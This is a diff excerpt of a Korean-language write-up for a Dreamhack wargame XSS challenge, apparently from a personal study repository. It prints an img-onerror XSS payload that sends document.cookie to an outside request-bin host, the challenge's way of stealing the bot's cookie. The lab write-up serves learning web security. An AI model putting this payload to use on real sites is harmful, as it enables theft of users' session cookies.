@@ -25,12 +25,15 @@ https://tools.dreamhack.games/main
 <br><br>
 ![3](https://user-images.githubusercontent.com/73854324/158157265-09b9806a-d126-4797-87d3-c5da739aac5c.png)<br>
 할당받은 url은 https://qwtdbvz.request.dreamhack.games 이다.   
+
 ```
 https://qwtdbvz.request.dreamhack.games?document.cookie
 ```
+
 이 곳으로 접속하면, 쿠키값을 가진채로 그냥 봇이 접속 할 것 같다.   
 vuln 페이지에서 xss 공격을 하기 위해서는 img 태그를 사용했었다.   
 ![4](https://user-images.githubusercontent.com/73854324/158157266-0a9455a1-546c-495e-a932-baa8d02926c3.png)<br>
+
 ```
 <img src="/" onerror="location.href='https://qwtdbvz.request.dreamhack.games?'+document.cookie">
 ```
